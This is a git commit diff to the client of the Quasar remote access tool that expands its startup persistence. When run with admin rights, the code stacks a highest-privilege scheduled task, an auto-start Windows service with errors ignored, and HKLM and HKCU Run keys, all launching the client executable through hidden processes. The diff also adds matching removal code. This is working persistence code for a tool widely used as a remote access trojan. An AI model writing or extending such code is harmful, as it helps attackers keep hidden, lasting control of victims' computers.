118ad85f1ef6d97fa8bdf6c50bfe11a09e3a8eb8
eric0210 <77634181+hsheric0210@users.noreply.github.com>
2023-04-18 23:04:12 +0900

    More client startups

--- Quasar.Client/Setup/ClientStartup.cs
+++ Quasar.Client/Setup/ClientStartup.cs
@@ -7,26 +7,37 @@ namespace Quasar.Client.Setup
 {
     public class ClientStartup : ClientSetupBase
     {
+        // Thank you, Autoruns!
+        //https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
         public void AddToStartup(string executablePath, string startupName)
         {
             if (UserAccount.Type == AccountType.Admin)
             {
                 ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                 {
-                    Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath +
-                                "\" /rl HIGHEST /f",
+                    Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath + "\" /rl HIGHEST /f",
                     UseShellExecute = false,
                     CreateNoWindow = true
                 };
 
                 Process p = Process.Start(startInfo);
                 p.WaitForExit(1000);
-                if (p.ExitCode == 0) return;
+
+                startInfo = new ProcessStartInfo("sc")
+                {
+                    // TODO: Custom name for service
+                    Arguments = "create " + startupName.Trim().Replace(' ', '_') + " DisplayName= \"" + startupName + "\" start= auto binPath= \"" + executablePath + "\" error= ignore",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                p = Process.Start(startInfo);
+                p.WaitForExit(1000);
+
+                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
             }
 
-            RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
-                true);
+            RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
         }
 
         public void RemoveFromStartup(string startupName)
@@ -42,11 +53,21 @@ namespace Quasar.Client.Setup
 
                 Process p = Process.Start(startInfo);
                 p.WaitForExit(1000);
-                if (p.ExitCode == 0) return;
+
+                startInfo = new ProcessStartInfo("sc")
+                {
+                    Arguments = "delete " + startupName.Trim().Replace(' ', '_'),
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                p = Process.Start(startInfo);
+                p.WaitForExit(1000);
+
+                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
             }
 
-            RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
+            RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
         }
     }
 }
